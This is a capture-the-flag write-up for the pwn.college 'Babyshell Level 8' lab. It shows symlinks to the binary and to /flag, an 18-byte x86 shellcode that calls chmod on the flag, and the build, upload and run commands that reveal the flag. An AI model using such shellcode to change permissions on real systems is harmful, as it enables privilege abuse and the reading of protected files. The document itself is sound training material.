# Babyshell Level 8
This challenge was relatively easy, just have to think outside the box a little.

The shellcode is reading 0x12 bytes of input this means we can't send a shellcode bigger than 0x12 bytes to our program.

The best option to my eyes was to call a chmod on the file directly, but you can't call chmod on /flag with less than 0x12 bytes, so for this reason i made a symlink to the binary in our home directory ("file named: shell8") and a symlink to the flag in the home directory ("file named : a").

```
$ ln -sf /challenge/babyshell_level8 ~/shell8
$ ln -sf /flag ~/a
```

Then with the following shellcode you should be able to chmod the symlink to the flag file.

```x86asm
.global _start
_start:
.intel_syntax noprefix
	push 0x61 ; "a" character
	push rsp 
	pop rdi
	mov sil, 4
	mov al, 90
	syscall
```

```
$ gcc -nostdlib -static -o shellcode
$ objcopy --dump-section .text=shell shellcode
$ scp shell hacker@dojo.pwn.college:/tmp
$ ssh hacker@dojo.pwn.college
$ cd ~
$ ./shell8 </tmp/shell
$ cat a
pwn.college{REDACTED}
```
